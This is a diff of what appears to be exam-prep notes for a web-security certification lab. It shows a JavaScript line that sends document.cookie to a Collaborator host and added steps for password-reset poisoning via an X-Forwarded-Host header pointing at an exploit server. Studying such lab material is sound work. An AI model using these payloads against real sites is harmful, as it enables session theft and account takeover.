@@ -716,7 +716,8 @@ document.location='https://Collaborator.com/?poisoncache='+document.cookie;
 
 >***Identify*** that altered HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
   
->Change the username parameter to Carlos and send the request.  
+>Include the below ```X- ``` headers and change the username parameter on the password reset request to ```Carlos``` before sending the request.  
+>In the exam if you used this exploit then it means you have no used vulnerability that require user interaction and may be used to gain access to stage 3 as admin.  
 
 ```html
 X-Forwarded-Host: EXPLOIT.net
